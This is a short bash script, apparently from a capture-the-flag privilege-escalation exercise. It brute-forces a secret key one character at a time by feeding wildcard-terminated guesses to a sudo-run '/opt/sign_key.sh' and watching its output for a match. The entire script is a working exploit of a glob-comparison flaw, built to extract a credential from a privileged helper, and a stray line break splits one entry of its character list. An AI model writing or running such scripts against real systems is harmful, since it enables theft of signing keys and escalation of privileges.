#!/bin/bash

> match.txt
> temp.txt

characters=("-" " " "+" "/" "=" '\n' '\r' "A" "B" "C" "D" "E" "F" "G" "H" "I" "J" "K" "L" "M" "N" "O" "P" "Q" "R" "S" "T" "U" "V" "W" "X" "Y" "Z" "a" "b" "c" "d" "e" "f" "g" "h" "i" "j" "k" "l" "m" "n" "o" "p" "q" "r" "s" "t
" "u" "v" "w" "x" "y" "z" "0" "1" "2" "3" "4" "5" "6" "7" "8" "9")

brute_force() {
  local match=$(cat match.txt)
  
  for char in "${characters[@]}"; do
    local test="${match}${char}*"
    echo -e "$test" > temp.txt
    local output=$(sudo /opt/sign_key.sh temp.txt temp.txt support support 1 2>&1)

    if echo "$output" | grep -q "API"; then
      echo -n "$char" >> match.txt
      echo -en "$char"
      brute_force
      return
    fi
  done

  rm temp.txt
  echo -e "\n[+] Finished!"
}

brute_force